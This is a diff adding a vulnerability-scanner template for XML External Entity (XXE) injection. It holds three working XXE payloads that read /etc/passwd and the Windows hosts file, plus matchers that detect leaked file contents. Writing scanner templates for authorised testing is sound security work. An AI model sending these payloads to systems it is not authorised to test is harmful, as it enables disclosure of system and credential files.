@@ -1,0 +1,54 @@
+# templates/xxe/xxe-file-disclosure.yaml
+id: xxe-file-disclosure
+info:
+  name: XXE File Disclosure Vulnerability
+  author: shadowxp
+  severity: high
+  description: Tests for XML External Entity injection leading to file disclosure
+  tags:
+    - xxe
+    - xml
+    - file-disclosure
+
+vulnerability_type: xxe
+
+request:
+  - method: POST
+    path: "{{BaseURL}}"
+    headers:
+      Content-Type: application/xml
+    body: "{{xxe_payload}}"
+    
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "\\[boot loader\\]"
+          - "\\[drivers\\]"
+        part: body
+      - type: word
+        words:
+          - "/bin/bash"
+          - "/bin/sh"
+          - "bin/false"
+        part: body
+
+payloads:
+  # Linux file disclosure
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <data>&xxe;</data>
+  # Windows file disclosure
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+    <data>&xxe;</data>
+  # Parameter entity
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
+    <data></data>
+
+encoders:
+  - xml_encode
